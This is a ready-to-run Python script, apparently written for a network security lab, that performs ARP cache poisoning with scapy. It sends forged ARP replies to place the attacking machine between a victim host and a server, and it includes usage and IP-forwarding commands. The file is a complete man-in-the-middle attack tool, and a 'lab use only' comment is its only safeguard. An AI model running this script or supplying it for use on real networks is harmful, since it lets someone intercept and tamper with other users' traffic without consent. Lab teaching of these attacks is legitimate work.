#!/usr/bin/env python3
"""
arp_spoof.py — ARP cache poisoning for the NETWORK SECURITY LAB.

Runs on the ATTACKER (Kali). Places this machine between two hosts on the
isolated host-only network (vboxnet0) by sending forged ARP replies, so
their traffic routes through here. Restores both caches cleanly on Ctrl+C.

LAB USE ONLY. Only run against machines you own on an isolated network.

    sudo python3 arp_spoof.py --victim 192.168.56.101 --server 192.168.56.10 -i eth0

Enable IP forwarding first so the victim's connectivity is not broken:
    sudo sysctl -w net.ipv4.ip_forward=1
"""
import argparse
import sys
import time

from scapy.all import ARP, Ether, send, srp, get_if_hwaddr, conf


def mac_of(ip, iface):
    """Resolve the real MAC of an IP via a normal ARP who-has."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, retry=3, iface=iface, verbose=False,
    )
    for _, r in ans:
        return r.hwsrc
    return None


def poison(target_ip, target_mac, spoof_ip, iface):
    """Tell target_ip that spoof_ip is at OUR mac (unsolicited ARP reply)."""
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac,
              psrc=spoof_ip, hwsrc=get_if_hwaddr(iface))
    send(pkt, iface=iface, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac, iface):
    """Undo the poison by broadcasting the correct mapping a few times."""
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac,
              psrc=source_ip, hwsrc=source_mac)
    send(pkt, count=5, iface=iface, verbose=False)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--victim", required=True, help="victim IP (e.g. the host, 192.168.56.101)")
    ap.add_argument("--server", required=True, help="the other endpoint (e.g. ApexGP, 192.168.56.10)")
    ap.add_argument("-i", "--iface", default=conf.iface, help="interface on the host-only net")
    ap.add_argument("--interval", type=float, default=2.0, help="seconds between poison bursts")
    args = ap.parse_args()

    print(f"[*] resolving MACs on {args.iface} ...")
    v_mac = mac_of(args.victim, args.iface)
    s_mac = mac_of(args.server, args.iface)
    if not v_mac or not s_mac:
        print(f"[!] could not resolve both MACs (victim={v_mac}, server={s_mac}).")
        print("    Check IPs, interface, and that both machines are up on vboxnet0.")
        sys.exit(1)

    print(f"[+] victim {args.victim} -> {v_mac}")
    print(f"[+] server {args.server} -> {s_mac}")
    print(f"[+] attacker {get_if_hwaddr(args.iface)}")
    print("[*] poisoning... (Ctrl+C to stop and restore)")

    sent = 0
    try:
        while True:
            # victim thinks WE are the server; server thinks WE are the victim
            poison(args.victim, v_mac, args.server, args.iface)
            poison(args.server, s_mac, args.victim, args.iface)
            sent += 2
            print(f"\r[+] sent {sent} forged ARP replies", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] restoring ARP caches ...")
        restore(args.victim, v_mac, args.server, s_mac, args.iface)
        restore(args.server, s_mac, args.victim, v_mac, args.iface)
        print("[+] done. caches restored.")


if __name__ == "__main__":
    main()
